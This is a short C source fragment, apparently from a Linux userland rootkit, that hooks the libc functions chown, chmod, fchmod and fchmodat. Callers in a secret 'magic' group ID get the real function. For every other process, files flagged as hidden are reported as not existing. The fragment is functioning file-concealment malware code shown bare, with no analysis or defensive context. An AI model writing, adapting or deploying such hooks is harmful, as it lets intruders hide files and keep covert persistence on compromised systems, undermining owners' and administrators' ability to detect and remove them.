int chown(const char *pathname, uid_t owner, gid_t group)
{
    HOOK(o_chown,"chown");
    if(getgid()==MGID) return o_chown(pathname,owner,group);
    if(hxstat(pathname)){ errno=ENOENT; return -1; }
    return o_chown(pathname,owner,group);
}
int chmod(const char *pathname, mode_t mode)
{
    HOOK(o_chmod,"chmod");
    if(getgid()==MGID) return o_chmod(pathname,mode);
    if(hxstat(pathname)){ errno=ENOENT; return -1; }
    return o_chmod(pathname,mode);
}
int fchmod(int fd, mode_t mode)
{
    HOOK(o_fchmod,"fchmod");
    if(getgid()==MGID) return o_fchmod(fd,mode);
    if(hfxstat(fd)){ errno=ENOENT; return -1; }
    return o_fchmod(fd,mode);
}
int fchmodat(int dirfd, const char *pathname, mode_t mode, int flags)
{
    HOOK(o_fchmodat,"fchmodat");
    if(getgid()==MGID) return o_fchmodat(dirfd,pathname,mode,flags);
    if(hfxstat(dirfd) || hxstat(pathname)){ errno=ENOENT; return -1; }
    return o_fchmodat(dirfd,pathname,mode,flags);
}
